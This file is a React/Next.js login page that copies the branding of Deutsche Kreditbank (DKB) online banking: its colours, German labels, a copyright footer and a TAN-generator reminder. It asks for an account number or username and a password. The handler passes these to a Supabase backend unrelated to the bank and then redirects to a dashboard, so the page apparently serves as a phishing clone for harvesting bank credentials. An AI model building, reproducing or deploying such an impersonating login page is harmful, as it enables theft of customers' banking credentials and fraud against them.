"use client"

import { type FormEvent, useState } from "react"
import { useRouter } from "next/navigation"
import { supabase } from "@/lib/supabase"


const DKB_NAVY = "#002c5c"
const BG_LIGHT = "#f3f9fe"
const FORM_BG = "#ffffff"
const TEXT_DARK = "#0d0e0f"
const TEXT_SUBDUED = "rgba(15, 47, 71, 0.66)"
const LABEL_COLOR = "#0f2f47"
const INPUT_BORDER = "rgba(8, 76, 128, 0.21)"
const INPUT_FOCUS = "#0976d6"
const BUTTON_BG = "#0d0e0f"
const BUTTON_HOVER = "#2a2e32"
const LINK_BLUE = "#006ac7"
const ERROR_COLOR = "#c22813"

export default function LoginPage() {
  const router = useRouter()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  async function handleSubmit(e: FormEvent) {
    e.preventDefault()
    if (!username.trim() || !password) return
    setError(null)
    setLoading(true)

    const { error } = await supabase.auth.signInWithPassword({
      email: username,
      password,
    })

    if (error) {
      setError(
        error.message === "Invalid login credentials"
          ? "Anmeldename oder Passwort falsch."
          : error.message,
      )
      setLoading(false)
      return
    }

    router.push("/dashboard")
  }

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: BG_LIGHT }}>
      <header style={{ backgroundColor: DKB_NAVY }}>
        <div className="mx-auto max-w-[1350px] px-6 py-4">
          <div className="flex items-center justify-between">
            <h1 className="text-[17px] font-[500] m-0" style={{ color: "#ffffff" }}>
              Mein Banking
            </h1>
            <a
              href="https://banking.dkb.de/login"
              className="text-[14px] font-[500] no-underline"
              style={{ color: "#ffffff" }}
            >
              Zum neuen Banking
            </a>
          </div>
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        <div className="w-full max-w-[480px] rounded-[12px] p-8 shadow-sm" style={{ backgroundColor: FORM_BG, border: "1px solid rgba(8, 76, 128, 0.12)" }}>
          <h1 className="text-[22px] font-[600] mb-6" style={{ color: TEXT_DARK }}>
            Anmeldung zum Internet-Banking
          </h1>

          <form onSubmit={handleSubmit}>
            <div className="mb-5">
              <label
                htmlFor="username"
                className="block text-[15px] font-[500] mb-1.5"
                style={{ color: LABEL_COLOR }}
              >
                Kontonummer / Anmeldename
              </label>
              <input
                id="username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                autoFocus
                autoComplete="username"
                className="w-full px-4 py-3 rounded-[6px] text-[16px] outline-none transition-colors"
                style={{
                  color: TEXT_DARK,
                  backgroundColor: BG_LIGHT,
                  border: `1px solid ${INPUT_BORDER}`,
                }}
                onFocus={(e) => {
                  e.currentTarget.style.borderColor = INPUT_FOCUS
                }}
                onBlur={(e) => {
                  e.currentTarget.style.borderColor = INPUT_BORDER
                }}
              />
            </div>

            <div className="mb-5">
              <label
                htmlFor="password"
                className="block text-[15px] font-[500] mb-1.5"
                style={{ color: LABEL_COLOR }}
              >
                Passwort
              </label>
              <input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                autoComplete="current-password"
                className="w-full px-4 py-3 rounded-[6px] text-[16px] outline-none transition-colors"
                style={{
                  color: TEXT_DARK,
                  backgroundColor: BG_LIGHT,
                  border: `1px solid ${INPUT_BORDER}`,
                }}
                onFocus={(e) => {
                  e.currentTarget.style.borderColor = INPUT_FOCUS
                }}
                onBlur={(e) => {
                  e.currentTarget.style.borderColor = INPUT_BORDER
                }}
              />
              <div className="mt-1.5 text-right">
                <a
                  href="#"
                  className="text-[13px] no-underline hover:underline"
                  style={{ color: LINK_BLUE }}
                >
                  Passwort vergessen?
                </a>
              </div>
            </div>

            {error && (
              <p className="text-[14px] mb-4" style={{ color: ERROR_COLOR }}>
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={!username.trim() || !password || loading}
              className="w-full py-[13px] rounded-[6px] text-[16px] font-[500] border-none cursor-pointer disabled:cursor-not-allowed transition-colors duration-200"
              style={{
                backgroundColor: (username.trim() && password && !loading) ? BUTTON_BG : "rgba(13, 14, 15, 0.2)",
                color: (username.trim() && password && !loading) ? "#ffffff" : "rgba(255,255,255,0.4)",
              }}
              onMouseOver={(e) => {
                if (username.trim() && password && !loading)
                  e.currentTarget.style.backgroundColor = BUTTON_HOVER
              }}
              onMouseOut={(e) => {
                if (username.trim() && password && !loading)
                  e.currentTarget.style.backgroundColor = BUTTON_BG
              }}
            >
              {loading ? "Wird geladen..." : "Anmelden"}
            </button>

            <div className="mt-4 text-center">
              <a
                href="#"
                className="text-[13px] no-underline hover:underline"
                style={{ color: LINK_BLUE }}
              >
                Anmeldename oder Passwort vergessen?
              </a>
            </div>
          </form>
        </div>

        <p className="mt-6 text-[13px] text-center max-w-[480px]" style={{ color: TEXT_SUBDUED }}>
          Nicht vergessen: Smartphone oder TAN-Generator bereitlegen.
        </p>
      </main>

      <footer style={{ backgroundColor: DKB_NAVY }}>
        <div className="mx-auto max-w-[1350px] px-6 py-5 flex flex-wrap gap-x-5 gap-y-1">
          <span className="text-[12px]" style={{ color: "rgba(255,255,255,0.6)" }}>
            &copy; 2026 Deutsche Kreditbank AG
          </span>
          <a href="#" className="text-[12px] no-underline hover:underline" style={{ color: "rgba(255,255,255,0.6)" }}>
            Impressum
          </a>
          <a href="#" className="text-[12px] no-underline hover:underline" style={{ color: "rgba(255,255,255,0.6)" }}>
            Datenschutz
          </a>
        </div>
      </footer>
    </div>
  )
}
